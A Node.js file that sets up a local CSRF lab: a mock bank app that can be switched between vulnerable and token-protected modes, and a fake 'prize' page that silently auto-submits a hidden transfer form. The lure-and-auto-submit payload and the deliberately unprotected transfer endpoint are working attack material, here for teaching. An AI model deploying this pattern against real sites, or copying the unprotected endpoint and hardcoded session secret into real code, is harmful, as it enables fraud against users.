const express = require('express');
const session = require('express-session');
const crypto = require('crypto');

// 1. Initialize Bank Server (Port 3000) & Attacker Server (Port 4000)
const bank = express();
const attacker = express();

bank.use(express.urlencoded({ extended: true }));
bank.use(session({
  name: 'bank_session_id',
  secret: 'bank-super-secret-key',
  resave: false,
  saveUninitialized: true,
  cookie: { httpOnly: true, sameSite: 'none', secure: false }
}));

// In-memory demo state
let balance = 5000;
let csrfProtection = false; // Toggle: false = Vulnerable, true = Mitigated

// ---------------------- BANK APPLICATION (PORT 3000) ---------------------- //

// Bank Dashboard
bank.get('/', (req, res) => {
  // Generate session-bound CSRF token if not already present
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(16).toString('hex');
  }

  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Apex Bank - CSRF Lab</title>
      <style>
        body { font-family: sans-serif; max-width: 600px; margin: 40px auto; line-height: 1.6; background: #f8fafc; color: #1e293b; }
        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); margin-bottom: 20px; }
        .vuln { color: #dc2626; font-weight: bold; }
        .safe { color: #16a34a; font-weight: bold; }
        input, button { padding: 8px 12px; margin: 6px 0; font-size: 14px; border: 1px solid #cbd5e1; border-radius: 6px; }
        button { background: #2563eb; color: white; border: none; cursor: pointer; }
        .btn-toggle { background: #475569; }
      </style>
    </head>
    <body>
      <div class="card">
        <h2>🏦 Apex Bank (Victim Application)</h2>
        <p>Logged in as: <b>Alice</b></p>
        <p style="font-size: 1.5rem;">Current Balance: <b>$${balance.toFixed(2)}</b></p>
        <p>
          CSRF Protection: 
          <span class="${csrfProtection ? 'safe' : 'vuln'}">
            ${csrfProtection ? 'ENABLED (Mitigated with CSRF Token)' : 'DISABLED (Vulnerable)'}
          </span>
        </p>
        <a href="/toggle"><button type="button" class="btn-toggle">Toggle Protection Mode</button></a>
        <a href="/reset"><button type="button" style="background: #64748b;">Reset Balance ($5,000)</button></a>
      </div>

      <div class="card">
        <h3>Transfer Money</h3>
        <form action="/transfer" method="POST">
          <!-- Hidden Anti-CSRF Token (Ignored in vulnerable mode, verified in mitigated mode) -->
          <input type="hidden" name="_csrf" value="${req.session.csrfToken}">
          
          <label>Recipient:</label><br>
          <input type="text" name="recipient" value="Bob" required><br>
          
          <label>Amount ($):</label><br>
          <input type="number" name="amount" value="1000" min="1" required><br>
          
          <button type="submit">Transfer Funds</button>
        </form>
        <p style="font-size: 12px; color: #64748b; margin-top: 10px;">
          Active Session CSRF Token: <code>${req.session.csrfToken}</code>
        </p>
      </div>
    </body>
    </html>
  `);
});

// Toggle Protection Mode
bank.get('/toggle', (req, res) => {
  csrfProtection = !csrfProtection;
  res.redirect('/');
});

// Reset Balance
bank.get('/reset', (req, res) => {
  balance = 5000;
  csrfProtection = false;
  res.redirect('/');
});

// Transfer Funds Endpoint (The Vulnerable / Mitigated Logic)
bank.post('/transfer', (req, res) => {
  const recipient = req.body.recipient || 'Unknown';
  const amount = Number(req.body.amount) || 0;
  const submittedToken = req.body._csrf;

  // MITIGATION: If protection is enabled, require valid session-bound CSRF token
  if (csrfProtection && submittedToken !== req.session.csrfToken) {
    return res.status(403).send(`
      <div style="font-family: sans-serif; max-width: 500px; margin: 50px auto; padding: 20px; border: 2px solid #ef4444; border-radius: 10px; background: #fef2f2;">
        <h2 style="color: #b91c1c;">403 Forbidden: CSRF Attack Blocked!</h2>
        <p>The server rejected the request because the <b>Anti-CSRF token</b> was missing or invalid.</p>
        <p><b>Decision:</b> Transfer cancelled. Funds are safe!</p>
        <a href="/">← Return to Bank Dashboard</a>
      </div>
    `);
  }

  // VULNERABLE PATH (or valid token): Execute balance deduction
  balance -= amount;
  res.send(`
    <div style="font-family: sans-serif; max-width: 500px; margin: 50px auto; padding: 20px; border: 1px solid #22c55e; border-radius: 10px; background: #f0fdf4;">
      <h2 style="color: #15803d;">Transfer Completed!</h2>
      <p>Successfully transferred <b>$${amount.toFixed(2)}</b> to <b>${recipient}</b>.</p>
      <p>Remaining Balance: <b>$${balance.toFixed(2)}</b></p>
      <a href="/">← Return to Bank Dashboard</a>
    </div>
  `);
});

// ---------------------- ATTACKER APPLICATION (PORT 4000) ------------------- //

attacker.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Exclusive Prize Claim!</title>
      <style>
        body { font-family: sans-serif; text-align: center; margin-top: 80px; background: #fffbeb; }
        .box { background: white; max-width: 450px; margin: auto; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); border: 2px dashed #f59e0b; }
      </style>
    </head>
    <body>
      <div class="box">
        <h2 style="color: #d97706;">🎁 Congratulations! You Won $1,000!</h2>
        <p>Redeeming your reward voucher now... please wait...</p>

        <!-- Hidden CSRF Form targeting Bank on Port 3000 -->
        <form id="csrfForm" action="http://localhost:3000/transfer" method="POST">
          <input type="hidden" name="recipient" value="Attacker_Charlie" />
          <input type="hidden" name="amount" value="1000" />
        </form>

        <!-- Auto-submit form immediately on page load -->
        <script>
          window.onload = function() {
            document.getElementById('csrfForm').submit();
          };
        </script>
      </div>
    </body>
    </html>
  `);
});

// ---------------------- START SERVERS ---------------------- //

bank.listen(3000, () => {
  console.log('🏦 Bank Application (Victim) running on http://localhost:3000');
});

attacker.listen(4000, () => {
  console.log('☠️  Attacker Application (Exploit) running on http://localhost:4000');
});
